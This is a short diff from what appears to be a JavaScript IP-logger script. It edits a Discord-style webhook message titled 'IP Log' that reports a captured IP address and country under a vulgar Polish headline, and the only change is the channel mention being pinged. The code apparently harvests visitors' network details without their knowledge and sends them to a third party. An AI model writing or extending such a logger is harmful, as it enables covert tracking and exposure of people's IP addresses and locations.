@@ -21,7 +21,7 @@ const request = async () => { // Calling a "synchronous" fetch
     var params = {
         username:   "IP Log",
         avatar_url: "",
-        content:    "**JAKAŚ KURWA KOGOŚ WKURWIŁA** @everyone \n" + 
+        content:    "**JAKAŚ KURWA KOGOŚ WKURWIŁA** @DODOS \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
                     "`" + ip + "` \n \n" +
 		    "__**Country:**__ \n" +
